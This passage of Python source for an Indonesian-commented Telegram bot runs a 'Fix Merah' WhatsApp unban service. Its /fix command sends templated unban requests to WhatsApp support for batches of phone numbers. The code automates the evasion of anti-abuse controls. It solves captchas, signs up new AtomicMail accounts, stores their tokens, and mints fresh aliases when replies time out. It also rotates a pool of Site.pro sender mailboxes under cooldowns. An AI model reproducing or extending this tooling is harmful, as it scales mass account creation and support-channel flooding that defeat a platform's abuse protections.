#  /set COMMAND — Set custom WhatsApp message template (per user)
# ════════════════════════════════════════════════════════════════

FIX_TEMPLATE_LANGS = ('ru', 'en', 'pt', 'id', 'es', 'ar')


def _fix_template_key(lang=None):
    """Bangun key bot_settings untuk template. lang None/'default' -> key lama."""
    if not lang or lang == 'default':
        return 'fix_template'
    return f'fix_template_{lang}'


def get_user_fix_template(user_id, lang=None):
    """Return template /fix milik user untuk bahasa tertentu.

    Resolusi: key bahasa spesifik -> key default (fix_template) -> None.
    """
    keys = []
    if lang and lang != 'default':
        keys.append(_fix_template_key(lang))
    keys.append('fix_template')
    for k in keys:
        try:
            cur.execute(
                "SELECT value FROM bot_settings WHERE user_id = ? AND key = ?",
                (user_id, k),
            )
            r = cur.fetchone()
            if r and r[0]:
                return r[0]
        except Exception:
            pass
    return None


async def set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/set <pesan> — set template pesan custom untuk /fix.

    Pesan harus mengandung placeholder ``{nomor}`` yang akan diganti dengan
    nomor target saat /fix dijalankan.

    Contoh:
        /set Halo, mohon cek nomor +{nomor}. Terima kasih.
    """
    if not update.effective_user:
        return
    user_id = update.effective_user.id

    # Ambil seluruh teks setelah "/set " (termasuk newline)
    raw_text = ""
    if update.message and update.message.text:
        raw_text = update.message.text
    # Hapus prefix command (mendukung /set, /set@BotName)
    import re as _re
    body = _re.sub(r"^\s*/set(@\S+)?\s*", "", raw_text, count=1)
    body = body.strip()

    # Deteksi opsi --lang xx di awal (feature multi-bahasa)
    sel_lang = None
    m_lang = _re.match(r"^--lang\s+([a-zA-Z]{2})\b\s*", body)
    if m_lang:
        cand = m_lang.group(1).lower()
        if cand in FIX_TEMPLATE_LANGS:
            sel_lang = cand
            body = body[m_lang.end():].strip()
        else:
            await update.message.reply_text(
                _screen('TEMPLATE /fix',
                        f"{em(E2,'❌')} Bahasa <code>{cand}</code> tidak didukung.\n"
                        f"Pilihan: {', '.join(FIX_TEMPLATE_LANGS)}"),
                parse_mode=ParseMode.HTML,
            )
            return
    save_key = _fix_template_key(sel_lang)

    # Kalau kosong → tampilkan template aktif + cara pakai
    if not body:
        current = get_user_fix_template(user_id)
        if current:
            import html as _h
            preview = _h.escape(current)
            if len(preview) > 1500:
                preview = preview[:1500].rstrip() + " …"
            text = _screen('TEMPLATE /fix', (
                f"{em(CE_FILE,'📁')} <b>Template aktif:</b>\n\n"
                f"<blockquote expandable>{preview}</blockquote>\n\n"
                f"Untuk mengganti, kirim:\n"
                f"<code>/set &lt;pesan baru&gt;</code>\n"
                f"Untuk reset ke default:\n"
                f"<code>/reset</code>"
            ))
        else:
            text = _screen('TEMPLATE /fix', (
                f"{em(CE_WHATSAPP,'❤️')} <b>Belum ada template custom.</b>\n\n"
                f"<b>Cara pakai:</b>\n"
                f"<code>/set Halo, mohon cek nomor +{{nomor}}. Terima kasih.</code>\n\n"
                f"📌 <b>Wajib:</b> mengandung placeholder <code>{{nomor}}</code>.\n"
                f"Saat /fix dijalankan, <code>{{nomor}}</code> otomatis diganti dengan nomor target.\n\n"
                f"Reset ke template default: <code>/reset</code>"
            ))
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        return

    # Validasi: harus ada {nomor}
    if "{nomor}" not in body:
        await update.message.reply_text(
            _screen('TEMPLATE /fix', (
                f"{em(E2,'❌')} <b>Template tidak valid.</b>\n\n"
                f"Pesan WAJIB mengandung placeholder <code>{{nomor}}</code> "
                f"yang nanti akan diganti dengan nomor WhatsApp target.\n\n"
                f"<b>Contoh:</b>\n"
                f"<code>/set Cek akun saya pada nomor +{{nomor}}.</code>"
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    # Batas panjang (biar tidak nge-DOS database)
    if len(body) > 8000:
        await update.message.reply_text(
            _screen('TEMPLATE /fix',
                    f"{em(E2,'❌')} <b>Pesan terlalu panjang.</b> "
                    f"Max 8000 karakter (kamu: {len(body)})."),
            parse_mode=ParseMode.HTML,
        )
        return

    # Simpan / replace
    try:
        cur.execute(
            "INSERT INTO bot_settings (user_id, key, value, updated_at) "
            "VALUES (?, ?, ?, CURRENT_TIMESTAMP) "
            "ON CONFLICT(user_id, key) DO UPDATE SET "
            "value=excluded.value, updated_at=CURRENT_TIMESTAMP",
            (user_id, save_key, body),
        )
        conn.commit()
    except Exception as e:
        await update.message.reply_text(
            _screen('TEMPLATE /fix',
                    f"{em(E2,'❌')} <b>Gagal simpan template.</b>\nError: {e}"),
            parse_mode=ParseMode.HTML,
        )
        return

    import html as _h
    preview = _h.escape(body)
    if len(preview) > 1200:
        preview = preview[:1200].rstrip() + " …"
    lang_label = f" (bahasa: {sel_lang})" if sel_lang else ""
    await update.message.reply_text(
        _screen('TEMPLATE /fix', (
            f"{em(E1,'✅')} <b>Template{lang_label} berhasil disimpan.</b>\n\n"
            f"<blockquote expandable>{preview}</blockquote>\n\n"
            f"Sekarang setiap kali kamu /fix &lt;nomor&gt;, template ini "
            f"yang akan dipakai (placeholder <code>{{nomor}}</code> akan diganti otomatis)."
        )),
        parse_mode=ParseMode.HTML,
    )


async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/reset — hapus template custom /fix, kembali ke default."""
    if not update.effective_user:
        return
    user_id = update.effective_user.id
    try:
        cur.execute(
            "DELETE FROM bot_settings WHERE user_id = ? AND key = ?",
            (user_id, 'fix_template'),
        )
        conn.commit()
    except Exception:
        pass
    await update.message.reply_text(
        _screen('TEMPLATE /fix',
                f"{em(E1,'✅')} <b>Template di-reset ke default.</b>"),
        parse_mode=ParseMode.HTML,
    )


async def preview_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/preview [nomor] — lihat preview pesan /fix TANPA mengirim apa-apa.

    Kalau ada template custom (via /set), preview pakai itu. Kalau tidak,
    preview pakai template default. Placeholder {nomor} diganti contoh nomor.

    Owner-only.
    """
    if not update.effective_user:
        return
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return

    # Nomor contoh (boleh dioverride lewat argumen)
    sample = "6281234567890"
    if context.args:
        digits = "".join(ch for ch in " ".join(context.args) if ch.isdigit())
        if digits:
            sample = digits

    tpl = get_user_fix_template(user_id)
    source = "custom (/set)" if tpl else "default"
    if tpl:
        body = tpl.replace("{nomor}", sample) if "{nomor}" in tpl else (tpl + f"\n\n+{sample}")
    else:
        body = (
            "Olá, Equipe de Suporte do WhatsApp, ...\n\n"
            f"Número de telefone : +{sample}\n\n"
            "(template default Português — gunakan /set untuk membuat custom)"
        )

    import html as _h
    preview = _h.escape(body)
    if len(preview) > 3000:
        preview = preview[:3000].rstrip() + " …"

    await update.message.reply_text(
        _screen('PREVIEW /fix', (
            f"{em(CE_FILE,'📁')} <b>Sumber template:</b> {source}\n"
            f"{em(CE_NOMOR,'📞')} <b>Nomor contoh:</b> <code>+{sample}</code>\n\n"
            f"<blockquote expandable>{preview}</blockquote>\n\n"
            f"<i>Ini hanya preview. Tidak ada email yang dikirim.</i>"
        )),
        parse_mode=ParseMode.HTML,
    )


# ════════════════════════════════════════════════════════════════
#  /clear COMMAND — hapus sender (mailbox) dari pool DB
# ════════════════════════════════════════════════════════════════

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/clear — hapus sender dari pool. Owner/admin only.

    Format:
        /clear                → tampilkan info penggunaan
        /clear all            → hapus SEMUA sender (sitepro_mailboxes)
        /clear 1-150          → hapus sender row_id 1..150
        /clear 150-end        → hapus sender row_id > 150
        /clear 1-150,200-300  → kombinasi (range terpisah koma)
    """
    if not update.effective_user:
        return
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return

    raw = " ".join(context.args).strip() if context.args else ""
    if not raw:
        try:
            cur.execute(
                "SELECT COUNT(*) FROM sitepro_mailboxes "
                "WHERE mailbox_id IS NOT NULL AND mailbox_id > 0"
            )
            total = (cur.fetchone() or [0])[0]
            cur.execute(
                "SELECT COUNT(*) FROM sitepro_mailboxes m "
                "WHERE m.mailbox_id IS NOT NULL AND m.mailbox_id > 0 "
                f"AND m.id IN ({_S1_IDS_SQL})"
            )
            s1 = (cur.fetchone() or [0])[0]
            cur.execute(
                "SELECT COUNT(*) FROM sitepro_mailboxes m "
                "WHERE m.mailbox_id IS NOT NULL AND m.mailbox_id > 0 "
                f"AND m.id NOT IN ({_S1_IDS_SQL})"
            )
            s2 = (cur.fetchone() or [0])[0]
        except Exception:
            total = s1 = s2 = 0
        await update.message.reply_text(
            _screen('CLEAR SENDER', (
                f"{em(CE_AKUN,'👤')} <b>Stok sender saat ini:</b>\n"
                f"  Total      : <b>{total}</b>\n"
                f"  Server 1 (id ≤ 150): <b>{s1}</b>\n"
                f"  Server 2 (id > 150): <b>{s2}</b>\n\n"
                f"<b>Cara pakai:</b>\n"
                f"  <code>/clear all</code> — hapus semua\n"
                f"  <code>/clear 1-150</code> — hapus partisi server 1\n"
                f"  <code>/clear 150-end</code> — hapus partisi server 2\n"
                f"  <code>/clear 1-150,200-300</code> — beberapa range\n\n"
                f"<i>Yang dihapus: baris di tabel sitepro_mailboxes. "
                f"Akun (sitepro_accounts) yang tidak punya mailbox lagi juga otomatis dihapus.</i>"
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    # Kumpulkan kondisi WHERE
    conds = []
    mode_desc = []
    if raw.lower() == 'all':
        conds.append("1=1")
        mode_desc.append("SEMUA sender")
    else:
        # Pisah koma, tiap segmen "a-b" / "a-end"
        import re as _re_clr
        bad = []
        for seg in [s.strip() for s in raw.split(',') if s.strip()]:
            m = _re_clr.match(r'^(\d+)\s*-\s*(\d+|end)$', seg, _re_clr.IGNORECASE)
            if not m:
                bad.append(seg)
                continue
            a = int(m.group(1))
            b_raw = m.group(2)
            if b_raw.lower() == 'end':
                conds.append(f"(id >= {a})")
                mode_desc.append(f"{a}–end")
            else:
                b = int(b_raw)
                if a > b:
                    a, b = b, a
                conds.append(f"(id BETWEEN {a} AND {b})")
                mode_desc.append(f"{a}–{b}")
        if bad:
            await update.message.reply_text(
                _screen('CLEAR SENDER',
                        f"{em(E2,'❌')} <b>Format salah:</b> <code>{', '.join(bad)}</code>\n"
                        f"Pakai <code>a-b</code> atau <code>a-end</code>."),
                parse_mode=ParseMode.HTML,
            )
            return
        if not conds:
            return

    where = " OR ".join(conds)
    try:
        cur.execute(f"SELECT COUNT(*) FROM sitepro_mailboxes WHERE {where}")
        will_del = (cur.fetchone() or [0])[0]
    except Exception as e:
        await update.message.reply_text(
            _screen('CLEAR SENDER',
                    f"{em(E2,'❌')} <b>Query gagal:</b> <code>{html.escape(str(e))}</code>"),
            parse_mode=ParseMode.HTML,
        )
        return

    if will_del == 0:
        await update.message.reply_text(
            _screen('CLEAR SENDER',
                    f"{em(E2,'⏭')} <b>Tidak ada sender yang cocok untuk dihapus.</b>"),
            parse_mode=ParseMode.HTML,
        )
        return

    # Eksekusi: hapus mailbox + akun yatim (orphan)
    try:
        cur.execute(f"DELETE FROM sitepro_mailboxes WHERE {where}")
        deleted_mb = cur.rowcount if hasattr(cur, 'rowcount') else will_del
        # Hapus akun yang sudah tidak punya mailbox
        cur.execute(
            "DELETE FROM sitepro_accounts WHERE id NOT IN "
            "(SELECT DISTINCT account_id FROM sitepro_mailboxes WHERE account_id IS NOT NULL)"
        )
        deleted_acc = cur.rowcount if hasattr(cur, 'rowcount') else 0
        conn.commit()
    except Exception as e:
        await update.message.reply_text(
            _screen('CLEAR SENDER',
                    f"{em(E2,'❌')} <b>Gagal hapus:</b> <code>{html.escape(str(e))}</code>"),
            parse_mode=ParseMode.HTML,
        )
        return

    await update.message.reply_text(
        _screen('CLEAR SENDER', (
            f"{em(E1,'✅')} <b>BERHASIL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  Mode      : <b>{', '.join(mode_desc)}</b>\n"
            f"  Mailbox   : <b>{deleted_mb}</b> dihapus\n"
            f"  Akun      : <b>{deleted_acc}</b> ikut dihapus (yatim)\n"
        )),
        parse_mode=ParseMode.HTML,
    )


# ════════════════════════════════════════════════════════════════
#  /show COMMAND — tampilkan jumlah sender aktif
# ════════════════════════════════════════════════════════════════

# Subquery: 150 sender dengan id TERKECIL = partisi Server 1 (rank-based).
# Server 2 = sisanya (id NOT IN subquery). Konsisten dengan picker di pipeline,
# tahan terhadap autoincrement yang sudah naik tinggi setelah penghapusan.
_S1_IDS_SQL = (
    "SELECT id FROM sitepro_mailboxes "
    "WHERE mailbox_id IS NOT NULL AND mailbox_id > 0 "
    "ORDER BY id ASC LIMIT 150"
)


def _count_senders():
    """Kembalikan dict berisi statistik sender saat ini.

    Keys:
      total       : total sender (mailbox_id valid)
      ready       : siap dipakai (cooldown lewat / belum pernah dipakai)
      cooldown    : sedang cooldown
      s1_total    : total partisi server 1 (id <= 150)
      s1_ready    : siap pada server 1
      s2_total    : total partisi server 2 (id > 150)
      s2_ready    : siap pada server 2
      acc_total   : total akun di DB
    """
    out = {'total': 0, 'ready': 0, 'cooldown': 0,
           's1_total': 0, 's1_ready': 0,
           's2_total': 0, 's2_ready': 0, 'acc_total': 0}
    try:
        cool = 3600  # 1 jam, sesuai SENDER_COOLDOWN_SECS di sitepro_fix_module
    except Exception:
        cool = 3600
    base_where = "mailbox_id IS NOT NULL AND mailbox_id > 0"
    ready_clause = (
        f"(last_used_at IS NULL OR last_used_at <= datetime('now', '-{cool} seconds'))"
    )
    try:
        cur.execute(f"SELECT COUNT(*) FROM sitepro_mailboxes WHERE {base_where}")
        out['total'] = (cur.fetchone() or [0])[0]
        cur.execute(
            f"SELECT COUNT(*) FROM sitepro_mailboxes "
            f"WHERE {base_where} AND {ready_clause}"
        )
        out['ready'] = (cur.fetchone() or [0])[0]
        out['cooldown'] = max(0, out['total'] - out['ready'])
        cur.execute(
            f"SELECT COUNT(*) FROM sitepro_mailboxes m "
            f"WHERE {base_where.replace('mailbox_id', 'm.mailbox_id')} "
            f"AND m.id IN ({_S1_IDS_SQL})"
        )
        out['s1_total'] = (cur.fetchone() or [0])[0]
        cur.execute(
            f"SELECT COUNT(*) FROM sitepro_mailboxes m "
            f"WHERE {base_where.replace('mailbox_id', 'm.mailbox_id')} "
            f"AND m.id IN ({_S1_IDS_SQL}) AND {ready_clause.replace('last_used_at', 'm.last_used_at')}"
        )
        out['s1_ready'] = (cur.fetchone() or [0])[0]
        cur.execute(
            f"SELECT COUNT(*) FROM sitepro_mailboxes m "
            f"WHERE {base_where.replace('mailbox_id', 'm.mailbox_id')} "
            f"AND m.id NOT IN ({_S1_IDS_SQL})"
        )
        out['s2_total'] = (cur.fetchone() or [0])[0]
        cur.execute(
            f"SELECT COUNT(*) FROM sitepro_mailboxes m "
            f"WHERE {base_where.replace('mailbox_id', 'm.mailbox_id')} "
            f"AND m.id NOT IN ({_S1_IDS_SQL}) AND {ready_clause.replace('last_used_at', 'm.last_used_at')}"
        )
        out['s2_ready'] = (cur.fetchone() or [0])[0]
        cur.execute("SELECT COUNT(*) FROM sitepro_accounts")
        out['acc_total'] = (cur.fetchone() or [0])[0]
    except Exception:
        pass
    return out


def _render_sender_card():
    """Bangun HTML card untuk SENDER stats. Reusable oleh /show & inline button."""
    s = _count_senders()
    return _screen('SENDER STATUS', (
        f"{em(CE_AKUN,'👤')} <b>Total sender:</b> <b>{s['total']}</b> "
        f"(siap: <b>{s['ready']}</b>, cooldown: {s['cooldown']})\n"
        f"  ├─ Server 1 (id ≤ 150): <b>{s['s1_total']}</b> "
        f"(siap: <b>{s['s1_ready']}</b>)\n"
        f"  └─ Server 2 (id > 150): <b>{s['s2_total']}</b> "
        f"(siap: <b>{s['s2_ready']}</b>)\n\n"
        f"{em(E1,'🧾')} <b>Akun di DB:</b> <b>{s['acc_total']}</b>\n\n"
        f"<i>'Siap' = sender belum pernah dipakai, atau cooldown 1 jam sudah lewat.</i>"
    ))


async def show_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/show — tampilkan jumlah sender aktif. Owner-only."""
    if not update.effective_user:
        return
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
    await update.message.reply_text(_render_sender_card(), parse_mode=ParseMode.HTML)


# ════════════════════════════════════════════════════════════════
#  /fix COMMAND — WhatsApp Unban Request
# ════════════════════════════════════════════════════════════════

def _parse_fix_numbers(text):
    """Parse nomor dari input user. Support: comma-separated, newline, spasi."""
    if not text:
        return []
    # Split by comma, newline, or space
    parts = re.split(r'[,\n\s]+', text.strip())
    numbers = []
    for p in parts:
        p = p.strip().replace("+", "").replace("-", "")
        if p and p.isdigit() and len(p) >= 8:
            numbers.append(p)
    return numbers


async def fix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/fix <nomor> — kirim permintaan unban WhatsApp ke support.

    /fix terbuka untuk SEMUA user (tidak butuh /adduser).
    """
    if not update.effective_user:
        return
    user_id = update.effective_user.id

    if CAPTCHA_SOLVER != "browser" and not CAPTCHA_API_KEY:
        await update.message.reply_text(
            _screen('FIX WHATSAPP',
                    f"{em(E2,'❌')} <b>Konfigurasi captcha belum siap.</b>"),
            parse_mode=ParseMode.HTML,
        )
        return

    raw = " ".join(context.args) if context.args else ""

    # Opsi --lang xx (pilih template bahasa tertentu yang sudah di-/set)
    import re as _re_fix
    sel_lang = None
    m = _re_fix.search(r"--lang\s+([a-zA-Z]{2})\b", raw)
    if m:
        cand = m.group(1).lower()
        if cand in FIX_TEMPLATE_LANGS:
            sel_lang = cand
        raw = (raw[:m.start()] + raw[m.end():]).strip()
    context.user_data['fix_lang'] = sel_lang

    numbers = _parse_fix_numbers(raw)

    # Max 5 nomor per perintah (1 akun bisa kirim sampai 5x)
    is_owner_user = (user_id == USER_ID)
    max_per_cmd = 50 if is_owner_user else 5
    if len(numbers) > max_per_cmd:
        await update.message.reply_text(
            _screen('FIX WHATSAPP',
                    f"{em(E2,'❌')} <b>Maksimal {max_per_cmd} nomor per perintah.</b>\n"
                    f"Kamu memasukkan {len(numbers)} nomor."),
            parse_mode=ParseMode.HTML,
        )
        return

    if not numbers:
        await update.message.reply_text(
            _screen('FIX WHATSAPP', (
                f"{em(CE_WHATSAPP,'❤️')} <b>Fix Merah WhatsApp</b>\n\n"
                f"<b>Cara pakai:</b>\n"
                f"  <code>/fix 6285757411154</code>\n"
                f"  <code>/fix 6281234567890, 6289876543210</code>\n\n"
                f"Bisa beberapa nomor sekaligus (maks <b>{max_per_cmd}</b>).\n"
                f"Satu perintah = satu permintaan, kirim ke setiap nomor."
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    num_list = "\n".join(
        f"  {em(CE_NOMOR,'📞')} <code>+{n}</code>" for n in numbers
    )
    text = _screen('FIX WHATSAPP', (
        f"{em(CE_WHATSAPP,'❤️')} <b>Nomor yang akan diproses ({len(numbers)}):</b>\n"
        f"{num_list}\n\n"
        f"Proses: kirim permintaan ke WhatsApp support, lalu cek balasan."
    ))

    fix_data_key = f"fix_numbers_{user_id}"
    context.user_data[fix_data_key] = numbers

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(
                "SERVER 1",
                callback_data=f"fix_srv1_{user_id}",
                icon_custom_emoji_id=E1,
                style="primary",
            ),
            InlineKeyboardButton(
                "SERVER 2",
                callback_data=f"fix_srv2_{user_id}",
                icon_custom_emoji_id=E1,
                style="primary",
            ),
        ],
      #  [
      #      InlineKeyboardButton(
      #          "SERVER 3 (API)",
      #          callback_data=f"fix_srv3_{user_id}",
       #         icon_custom_emoji_id=E1,
       #         style="primary",
       #     ),
      #  ],
        [
            InlineKeyboardButton(
                "BATAL",
                callback_data=f"fix_cancel_{user_id}",
                icon_custom_emoji_id=E2,
                style="danger",
            ),
        ],
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)


async def _process_fix_api_background(numbers, user_id, message, context):
    """Background worker /fix SERVER 3: jalur AtomicMail API.

    1 akun AtomicMail dibuat (browser cuma untuk mint captcha sign-up),
    token disimpan ke DB, lalu kirim ke tiap nomor + cek balasan. Kalau
    timeout, buat alias baru (sampai 10) & kirim ulang. Alias/kirim coba
    tanpa captcha dulu (lazy), jadi browser minim dipakai.
    """
    import functools, html as _html
    try:
        from atomicmail_api import run_atomic_fix_pipeline_api, DEFAULT_MAX_ALIAS_PER_ACCOUNT
        from atomic_token_minter import TokenMinter
    except Exception as e:
        try:
            await message.edit_text(
                _screen('FIX WHATSAPP · SERVER 3 (API)',
                        f"{em(E2,'❌')} Modul API tidak tersedia: {_html.escape(str(e))}"),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    main_loop = asyncio.get_running_loop()
    state = {'stage': 'starting', 'msg': '', 'sent': 0, 'replied': 0,
             'alias': 0, 'account': ''}

    def _render():
        return _screen('FIX WHATSAPP · SERVER 3 (API)', (
            f"{em(CE_LOADING,'🟠')} <b>{state['stage']}</b>\n\n"
            f"  {em(CE_AKUN,'👤')} Akun: <b>{_html.escape(state['account'] or '-')}</b>\n"
            f"  {em(CE_WHATSAPP,'❤️')} Balasan WA: <b>{state['replied']}/{len(numbers)}</b>\n"
            f"  {em(E1,'📤')} Terkirim: <b>{state['sent']}</b>\n"
            f"  {em(E6,'🚀')} Alias dibuat: <b>{state['alias']}</b>"
            + (f"\n\n<i>{_html.escape(state['msg'])}</i>" if state['msg'] else "")
        ))

    async def _safe_edit():
        try:
            await message.edit_text(_render(), parse_mode=ParseMode.HTML)
        except Exception:
            pass

    def _push():
        try:
            asyncio.run_coroutine_threadsafe(_safe_edit(), main_loop)
        except Exception:
            pass

    def _cb(stage, data):
        state['stage'] = stage
        if stage == 'signup_start':
            state['msg'] = 'Daftar akun AtomicMail baru...'
        elif stage == 'signup_ok':
            state['account'] = data.get('address', '')
            state['msg'] = f"Akun siap: {data.get('address','')}"
        elif stage == 'send_start':
            state['msg'] = f"Kirim dari {data.get('from','?')} (coba {data.get('try','?')})"
        elif stage == 'send_ok':
            state['sent'] += 1
            state['msg'] = f"Terkirim id={data.get('resp',{}).get('id','?')}"
        elif stage == 'send_err':
            state['msg'] = f"❌ Send: {str(data.get('err',''))[:120]}"
        elif stage == 'wait_reply':
            state['msg'] = "Menunggu balasan support@support.whatsapp.com..."
        elif stage == 'reply':
            state['replied'] += 1
            state['msg'] = f"✅ Balasan diterima!"
        elif stage == 'alias_new':
            state['alias'] += 1
            state['msg'] = f"Alias baru: {data.get('alias','?')} ({data.get('used','?')}/{data.get('limit','?')})"
        elif stage == 'alias_limit':
            state['msg'] = f"Alias habis ({data.get('used','?')}/{data.get('limit','?')})."
        elif stage == 'alias_err':
            state['msg'] = f"❌ Alias: {str(data.get('err',''))[:120]}"
        _push()

    def _save_account(info):
        try:
            cur.execute(
                "INSERT INTO atomicmail_accounts "
                "(user_id, address, username, atomic_user_id, access_token, session_id, status) "
                "VALUES (?, ?, ?, ?, ?, ?, 'active')",
                (user_id, info.get('address'), info.get('username'),
                 info.get('user_id'), info.get('access_token'), info.get('session_id')),
            )
            conn.commit()
        except Exception as _e:
            print(f"[ATOMIC] save account err: {_e}")

    await _safe_edit()
    phones = [str(n) for n in numbers]

    # 1) Coba pakai akun/token existing dulu dari DB (hemat browser).
    existing_token = None
    existing_addr = None
    try:
        cur.execute(
            "SELECT access_token, address FROM atomicmail_accounts "
            "WHERE user_id=? AND status='active' AND access_token IS NOT NULL "
            "ORDER BY id DESC LIMIT 1",
            (user_id,),
        )
        row = cur.fetchone()
        if row:
            existing_token, existing_addr = row[0], row[1]
    except Exception as _e:
        print(f"[ATOMIC] load existing token err: {_e}")

    # 2) Jalankan pipeline. Kalau ada token existing, coba API-only dulu.
    minter = None
    try:
        if existing_token:
            state['msg'] = f"Pakai akun existing: {existing_addr}"
            _push()
            try:
                res = await main_loop.run_in_executor(
                    None,
                    functools.partial(
                        run_atomic_fix_pipeline_api,
                        phones,
                        reply_timeout=240,
                        max_alias_per_account=DEFAULT_MAX_ALIAS_PER_ACCOUNT,
                        progress_cb=_cb,
                        existing_access_token=existing_token,
                    ),
                )
            except Exception as e:
                print(f"[ATOMIC] existing token gagal, fallback signup browser: {e}")
                existing_token = None

        if not existing_token:
            minter = TokenMinter(headless=False)
            res = await main_loop.run_in_executor(
                None,
                functools.partial(
                    run_atomic_fix_pipeline_api,
                    phones,
                    reply_timeout=240,
                    max_alias_per_account=DEFAULT_MAX_ALIAS_PER_ACCOUNT,
                    progress_cb=_cb,
                    minter=minter,
                    on_account_saved=_save_account,
                ),
            )
    except Exception as e:
        try:
            await message.edit_text(
                _screen('FIX WHATSAPP · SERVER 3 (API)',
                        f"{em(E2,'❌')} Pipeline error: {_html.escape(str(e))[:300]}"),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return
    finally:
        if minter is not None:
            try:
                await main_loop.run_in_executor(None, minter.close)
            except Exception:
                pass

    ok = res.get('success_count', 0)
    fail = res.get('fail_count', 0)
    try:
        await message.edit_text(
            _screen('FIX WHATSAPP · SERVER 3 (API) — SELESAI', (
                f"{em(CE_AKUN,'👤')} <b>Akun:</b> {_html.escape(res.get('account',{}).get('address','-'))}\n"
                f"  {em(CE_WHATSAPP,'❤️')} Berhasil: <b>{ok}</b>\n"
                f"  {em(E2,'❌')} Gagal: <b>{fail}</b>\n"
                f"  {em(E6,'🚀')} Alias dipakai: <b>{res.get('aliases_used',0)}</b>\n\n"
                f"<i>Token akun disimpan. Pengiriman berikutnya bisa pakai token tanpa browser lagi.</i>"
            )),
            parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def _process_fix_background(numbers, user_id, message, context):
    """Background worker /fix: 1 akun, kirim ke banyak nomor + cek balasan."""
    total = len(numbers)
    main_loop = asyncio.get_running_loop()

    can_start, limit_msg = _sitepro_can_start(user_id)
    if not can_start:
        try:
            await message.edit_text(
                _screen('FIX WHATSAPP',
                        f"{em(E2,'❌')} {limit_msg}"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    # State untuk progress (di-update dari thread, dirender dari async)
    state = {
        'stage': 'starting',
        'sent_done': 0,
        'reply_done': 0,
    }

    def _render(stage_label):
        sent = state['sent_done']
        rep = state['reply_done']
        body = (
            f"{em(CE_LOADING,'🟠')} <b>{stage_label}</b>\n\n"
            f"  {em(CE_NOMOR,'📞')} Nomor: <b>{total}</b>\n"
            f"  {em(E6,'🚀')} Terkirim: <b>{sent}/{total}</b>\n"
            f"  {em(CE_WHATSAPP,'❤️')} Balasan: <b>{rep}</b>\n"
        )
        return _screen('FIX WHATSAPP', body)

    async def _safe_edit(text):
        try:
            await message.edit_text(text, parse_mode=ParseMode.HTML)
        except Exception:
            pass

    def _progress_cb(stage, data):
        # Dipanggil dari thread pipeline. Schedule update di main loop.
        if stage == 'account_ready':
            state['stage'] = 'kirim'
            reused = bool((data or {}).get('reused'))
            label = "Akun siap (digunakan ulang)..." if reused else "Akun baru siap..."
        elif stage == 'sent':
            if data.get('ok'):
                state['sent_done'] += 1
            label = "Mengirim permintaan ke WhatsApp support..."
        elif stage == 'reply':
            state['reply_done'] += 1
            label = "Balasan diterima dari WhatsApp!"
        else:
            label = "Memproses..."
        try:
            asyncio.run_coroutine_threadsafe(_safe_edit(_render(label)), main_loop)
        except Exception:
            pass

    # Initial status
    await _safe_edit(_render("Menyiapkan akun..."))

    try:
        # Jalankan pipeline di thread (lewat global pool) agar event loop tidak ke-block,
        # dan tugas user lain BISA jalan paralel tanpa antri.
        import functools

        # Ambil template custom user (kalau ada) dari /set, sesuai bahasa terpilih
        try:
            _sel_lang = context.user_data.get('fix_lang') if context else None
            custom_template = get_user_fix_template(user_id, _sel_lang)
        except Exception:
            custom_template = None

        _sel_server = None
        try:
            _sel_server = int(context.user_data.get('fix_server') or 0) or None
        except Exception:
            _sel_server = None

        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            _SITEPRO_GLOBAL_POOL,
            functools.partial(
                run_fix_multi_pipeline,
                numbers,
                CAPTCHA_API_KEY,
                cur,
                conn,
                CAPTCHA_SOLVER,
                240,         # reply_wait (4 menit)
                _progress_cb,
                MAX_SENDS_PER_ACCOUNT,
                custom_template,  # message_template
                _sel_server,      # server (1=row_id<=150, 2=row_id>150)
            ),
        )

        # Build final report
        nomor_status = result.get('numbers', [])
        total_sent = result.get('total_sent', 0)
        total_reply = result.get('total_replied', 0)
        newest = result.get('newest_reply')

        lines = []
        for ns in nomor_status:
            n = ns['nomor']
            if ns['replied']:
                icon = em(E1, '✅')
                tag = "balasan diterima"
            elif ns['sent']:
                icon = em(CE_LOADING, '🟠')
                tag = "terkirim, belum ada balasan"
            else:
                icon = em(E2, '❌')
                tag = "gagal kirim"
            lines.append(f"  {icon} <code>+{n}</code> — {tag}")

        reused_tag = ""
        if result.get('account_reused'):
            reused_tag = f"  {em(CE_AKUN,'👤')} Akun: <i>digunakan ulang</i> (sisa {result.get('sends_left',0)} kirim)\n"
        else:
            reused_tag = f"  {em(CE_AKUN,'👤')} Akun: <i>baru dibuat</i> (sisa {result.get('sends_left',0)} kirim)\n"

        header = (
            f"{em(CE_WHATSAPP,'❤️')} <b>Hasil Fix Merah</b>\n\n"
            f"  {em(CE_NOMOR,'📞')} Total nomor: <b>{total}</b>\n"
            f"  {em(E6,'🚀')} Terkirim: <b>{total_sent}/{total}</b>\n"
            f"  {em(E1,'✅')} Mendapat balasan: <b>{total_reply}</b>\n"
            f"{reused_tag}"
        )

        body = header + "\n<b>Detail per nomor:</b>\n" + ("\n".join(lines) if lines else "  -")

        # ── Balasan WhatsApp Support (template card) ─────────────
        # Hanya tampilkan metadata: dari WhatsApp support + subject + nomor.
        # Body sengaja TIDAK ditampilkan (sesuai permintaan user) karena sering
        # memuat ekor "Dikirim dengan email Site.pro" + echo pesan yang kita
        # kirim, jadi tidak informatif untuk end-user.
        if newest:
            import html as _h
            reply_subject = _h.escape(newest.get('subject', '') or '')
